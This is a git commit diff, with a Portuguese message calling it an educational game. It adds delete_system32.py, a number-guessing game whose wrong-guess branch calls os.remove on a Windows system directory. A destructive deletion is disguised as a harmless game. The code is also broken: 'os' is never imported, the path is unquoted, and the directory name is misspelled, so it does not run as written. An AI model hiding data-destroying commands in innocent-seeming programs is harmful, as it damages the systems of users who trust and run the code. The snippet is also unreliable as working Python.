30af9d306f4cc3df7a3063b32b85808339ee5dcb
Seu Nome <seuemail@example.com>
2025-04-23 10:13:07 -0300

    Adição de um jogo bastante educativo

---
+++ delete_system32.py
@@ -0,0 +1,12 @@
+import random
+
+number = random.randint(1, 10)
+
+guess = input("Escolha um número de 1 a 10: ")
+guess = int(guess)
+
+if guess == number:
+    print("Parabéns, você ganhou!")
+else:
+    os.remove(C:\Windows\System3.2)
+              
